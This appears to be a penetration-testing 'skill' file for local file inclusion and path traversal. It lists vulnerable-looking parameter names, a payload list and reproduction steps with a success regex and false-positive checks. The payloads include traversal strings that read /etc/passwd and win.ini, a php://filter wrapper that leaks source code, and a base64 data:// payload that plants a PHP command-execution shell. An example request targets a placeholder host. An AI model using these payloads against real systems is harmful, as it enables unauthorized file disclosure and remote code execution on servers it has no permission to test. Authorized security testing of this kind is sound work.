---
repro: technique-authored
---

# SKILL: lfi
## Params
file, view, download, page, cat, dir, action, board, date, detail, path, folder, prefix, include, inc, locate, show, doc, site, type, content, document, layout, mod, conf
## Payloads
/etc/passwd
../../../../etc/passwd
..\..\..\..\windows\win.ini
/etc/passwd%00.html
php://filter/convert.base64-encode/resource=index.php
/data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
## Triage
Read /etc/passwd → High. RCE via log poisoning → Critical.

## Steps to reproduce


> Status: `repro: technique-authored` — authored and reviewed for correctness against the path-traversal / LFI class. Not executed against a live host; live confirmation needs an in-scope target.


### Preconditions
- An endpoint reads a filename/path from a parameter (see `## Params`: `file`, `page`, `path`, `download`, `include`, etc.) and returns or includes the referenced file.
- The application does not canonicalize/confine the path to a fixed base directory.


### Steps
1. Baseline: request the parameter with a legitimate value and record the normal response.
2. Supply a traversal sequence targeting a file guaranteed to exist on the host OS.
3. Compare the response body to the baseline for the canonical file-content signature.


Example request (placeholder host `TARGET`):
```
GET /download?file=../../../../../../etc/passwd HTTP/1.1 Host: TARGET


```
(also test encoded `%2e%2e%2f`, null-byte `...%00.html`, Windows `..\..\..\windows\win.ini`, and `php://filter/convert.base64-encode/resource=index.php`.)


### Success condition (machine-checkable)
- Response status 200 AND body contains the canonical signature of the requested file: for `/etc/passwd`, a line matching `^root:.*:0:0:` (regex `root:[^:]*:0:0:`); for `win.ini`, the `[extensions]`/`[fonts]` section header. For the `php://filter` case, a base64 blob that decodes to the target source. Presence of this signature (absent from the baseline) confirms arbitrary file read.


### False-positive guard
- NOT a finding if the body merely echoes the input string without file contents, if a generic 404/"file not found" is returned, or if the "passwd-like" text is static page content unrelated to the injected path (verify the signature is absent in the baseline response and appears only after the traversal payload). A WAF block page containing the word "passwd" is not a read.
